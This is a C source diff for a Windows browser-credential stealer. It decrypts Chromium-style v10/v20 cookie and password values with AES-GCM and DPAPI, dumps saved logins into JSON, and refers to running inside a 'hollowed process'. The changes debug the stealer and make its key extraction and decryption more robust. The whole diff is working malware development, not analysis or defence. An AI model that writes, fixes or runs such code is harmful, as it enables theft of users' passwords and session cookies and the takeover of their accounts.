@@ -125,7 +125,7 @@ static void DbgInt(const char* msg, int val){
 #endif
 
 // ------------------------------------------------------------------ dynamically-loaded APIs
-static HMODULE g_sql, g_bc, g_c32;
+static HMODULE g_sql, g_c32;
 typedef int  (__cdecl *tOpenV2)(const char*,void**,int,const char*);
 typedef int  (__cdecl *tPrep16)(void*,const void*,int,void**,const void**);
 typedef int  (__cdecl *tStep)(void*);  typedef int (__cdecl *tInt)(void*,int);
@@ -162,41 +162,30 @@ static bool Dpapi(const unsigned char* in, DWORD nin, unsigned char* out, DWORD*
 }
 
 // AES-256-GCM decryption via CNG (BCrypt*)
+// Uses direct bcrypt.lib calls (bcrypt.lib is linked in build.bat).
+// Previously used GetProcAddress but the function pointer typedefs caused
+// STATUS_INVALID_PARAMETER (0xC0000003) in the hollowed process.
 static bool AesGcm(const unsigned char* key, ULONG klen, const unsigned char* iv,
                    const unsigned char* ct, ULONG clen, const unsigned char* tag,
                    unsigned char* out, ULONG outcap, ULONG* nout){
-    typedef NTSTATUS(WINAPI *tOpen)(BCRYPT_ALG_HANDLE*,LPCWSTR,ULONG);
-    typedef NTSTATUS(WINAPI *tGen)(BCRYPT_ALG_HANDLE,BCRYPT_KEY_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
-    typedef NTSTATUS(WINAPI *tSet)(BCRYPT_ALG_HANDLE,LPCWSTR,PUCHAR,ULONG,ULONG);
-    typedef NTSTATUS(WINAPI *tDec)(BCRYPT_KEY_HANDLE,PUCHAR,ULONG,void*,
-                 PUCHAR,ULONG,PUCHAR,ULONG,ULONG*,ULONG);
-    typedef NTSTATUS(WINAPI *tDelK)(BCRYPT_KEY_HANDLE);
-    typedef NTSTATUS(WINAPI *tClose)(BCRYPT_ALG_HANDLE,ULONG);
-    g_bc = g_bc ? g_bc : LoadLibraryA("bcrypt.dll"); if(!g_bc) return false;
-    tOpen  a=(tOpen )GetProcAddress(g_bc,"BCryptOpenAlgorithmProvider");
-    tGen   g=(tGen  )GetProcAddress(g_bc,"BCryptGenerateSymmetricKey");
-    tSet   s=(tSet  )GetProcAddress(g_bc,"BCryptSetProperty");
-    tDec   d=(tDec  )GetProcAddress(g_bc,"BCryptDecrypt");
-    tDelK  dk=(tDelK)GetProcAddress(g_bc,"BCryptDestroyKey");
-    tClose cl=(tClose)GetProcAddress(g_bc,"BCryptCloseAlgorithmProvider");
-    if(!a||!g||!s||!d) return false;
     BCRYPT_ALG_HANDLE alg=NULL; BCRYPT_KEY_HANDLE k=NULL; NTSTATUS st;
-    st = a(&alg,BCRYPT_AES_ALGORITHM,0); if(st) return false;
-    st = s(alg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,
+    st = BCryptOpenAlgorithmProvider(&alg,BCRYPT_AES_ALGORITHM,NULL,0);
+    if(st){ DbgInt("AesGcm: OpenAlg failed", st); return false; }
+    st = BCryptSetProperty(alg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            (ULONG)(lstrlenW(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR),0);
-    if(st){ if(cl)cl(alg,0); return false; }
-    st = g(alg,&k,NULL,0,(PUCHAR)key,klen,0); if(st){ if(cl)cl(alg,0); return false; }
+    if(st){ DbgInt("AesGcm: SetChaining failed", st); BCryptCloseAlgorithmProvider(alg,0); return false; }
+    st = BCryptGenerateSymmetricKey(alg,&k,NULL,0,(PUCHAR)key,klen,0);
+    if(st){ DbgInt("AesGcm: GenKey failed", st); BCryptCloseAlgorithmProvider(alg,0); return false; }
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
     memset(&info,0,sizeof(info));
     BCRYPT_INIT_AUTH_MODE_INFO(info);
     info.pbNonce = (PUCHAR)iv; info.cbNonce = 12;
     info.pbTag   = (PUCHAR)tag; info.cbTag  = 16;
-    if(clen>outcap){ if(dk)dk(k); if(cl)cl(alg,0); return false; }
+    if(clen>outcap){ BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg,0); return false; }
     ULONG need=0;
-    // GCM: plaintext size = ciphertext size; single call suffices (tag verified on decrypt)
-    st = d(k,(PUCHAR)ct,clen,&info,NULL,0,out,outcap,&need,0);
-    if(dk)dk(k); if(cl)cl(alg,0);
-    if(st) return false;
+    st = BCryptDecrypt(k,(PUCHAR)ct,clen,&info,NULL,0,out,outcap,&need,0);
+    BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg,0);
+    if(st){ DbgInt("AesGcm: BCryptDecrypt status", st); return false; }
     *nout = need;
     return true;
 }
@@ -343,8 +332,21 @@ static void LoadLocalState(const wchar_t* root){
         CryptStringToBinaryA(b64,0,CRYPT_STRING_BASE64,raw,&rl,NULL,NULL);
         Dbg("LoadLocalState: b64 decoded OK");
         if(w==0){                                                    // v10/v11: user DPAPI
-            if(raw[0]=='D'&&raw[1]=='P'&&raw[2]=='A'&&raw[3]=='P'&&raw[4]=='I'){ rl=32;
-                g_has10 = Dpapi(raw+5,rl-5,g_key10,&rl,false)&&rl>=16; }
+            DbgInt("LoadLocalState: v10 raw len", rl);
+            DbgInt("LoadLocalState: v10 raw[0]", raw[0]);
+            if(raw[0]=='D'&&raw[1]=='P'&&raw[2]=='A'&&raw[3]=='P'&&raw[4]=='I'){
+                // DPAPI prefix (5 bytes) + encrypted key blob
+                DWORD outlen = sizeof(g_key10);
+                g_has10 = Dpapi(raw+5, rl-5, g_key10, &outlen, false) && outlen>=16;
+                DbgInt("LoadLocalState: Dpapi result", g_has10?1:0);
+                DbgInt("LoadLocalState: Dpapi outlen", outlen);
+                if(g_has10) DbgInt("LoadLocalState: key10[0]", g_key10[0]);
+            } else {
+                Dbg("LoadLocalState: raw does not start with DPAPI, trying direct");
+                // Some versions store the key without DPAPI wrapping
+                if(rl>=32){ memcpy(g_key10,raw,32); g_has10=true; Dbg("LoadLocalState: v10 direct key OK"); }
+                else { Dbg("LoadLocalState: v10 key too short, no DPAPI prefix"); }
+            }
         } else {                                                     // v20: read pre-extracted key
             HANDLE k = CreateFileW(L"C:\\ProgramData\\cookielog\\v20.key",GENERIC_READ,
                                    FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
@@ -361,16 +363,18 @@ static void LoadLocalState(const wchar_t* root){
 // Format: "v10" or "v20" prefix (3 bytes) + 12-byte nonce + ciphertext + 16-byte GCM tag
 // v20 has an additional 32-byte SHA256 domain hash prefix in the plaintext
 static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* on){
-    if(n<31) return false;
+    if(n<31){ DbgInt("DecCookie: n too small", n); return false; }
     const unsigned char* k = g_key10;
     bool isv20 = (enc[0]=='v'&&enc[1]=='2'&&enc[2]=='0');
-    if(isv20){ if(!g_has20) return false; k=g_key20; }
-    else if(enc[0]=='v'&&(enc[1]=='0'||enc[1]=='1')){ if(!g_has10) return false; k=g_key10; }
-    else return false;
+    if(isv20){ if(!g_has20){ Dbg("DecCookie: no v20 key"); return false; } k=g_key20; }
+    else if(enc[0]=='v'&&(enc[1]=='0'||enc[1]=='1')){ if(!g_has10){ Dbg("DecCookie: no v10 key"); return false; } k=g_key10; }
+    else{ Dbg("DecCookie: unknown version prefix"); return false; }
     ULONG got=0;
-    if(!AesGcm(k,32,enc+3,enc+15,n-15-16,enc+n-16,out,n-15-16,&got)) return false;
+    ULONG ctLen = n-15-16;
+    bool ok = AesGcm(k,32,enc+3,enc+15,ctLen,enc+n-16,out,ctLen,&got);
+    if(!ok){ DbgInt("DecCookie: AesGcm failed, n=", n); return false; }
     int s = isv20 ? 32 : 0;      // v20 has 32-byte SHA256 domain hash prefix in plaintext
-    if((int)got < s) return false;
+    if((int)got < s){ DbgInt("DecCookie: got < s, got=", got); return false; }
     *on = (int)(got - s); memmove(out,out+s,*on); return true;
 }
 
@@ -582,7 +586,7 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root){
         rc=S_prep(con,SQL,-1,&st,NULL);
         if(rc){ DbgInt("DumpPasswords: S_prep failed", rc); S_close(con); continue; }
         Dbg("DumpPasswords: S_prep OK, stepping");
-        int rows=0;
+        int rows=0, dec_ok=0, dec_fail=0;
         while(S_step(st)==100){
             rows++;
             const char* url=(const char*)S_blob(st,0); int url_len=S_bytes(st,0);
@@ -591,12 +595,16 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root){
 
             // Decrypt password (same as cookies: v10/v20 + AES-256-GCM)
             char pwd[4096]; int pwd_len=0;
+            bool pwd_ok = false;
             if(enc_len > 3 && enc[0]=='v'){
-                DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len);
+                pwd_ok = DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len);
             }
-            if(pwd_len <= 0){ // not encrypted or decryption failed
-                memcpy(pwd, enc, enc_len < (int)sizeof(pwd) ? enc_len : (int)sizeof(pwd));
-                pwd_len = enc_len;
+            if(pwd_ok){ dec_ok++; }
+            else{
+                // Decryption failed — write empty value instead of raw encrypted bytes
+                // (raw v10 blobs are useless and pollute the JSON with binary garbage)
+                pwd_len = 0;
+                dec_fail++;
             }
 
             RecStart();
@@ -611,6 +619,8 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root){
             PutS("}");
         }
         DbgInt("DumpPasswords: rows extracted", rows);
+        DbgInt("DumpPasswords: decrypted OK", dec_ok);
+        DbgInt("DumpPasswords: decrypt failed", dec_fail);
         S_fin(st); S_close(con);
     }
     Dbg("DumpPasswords: done");
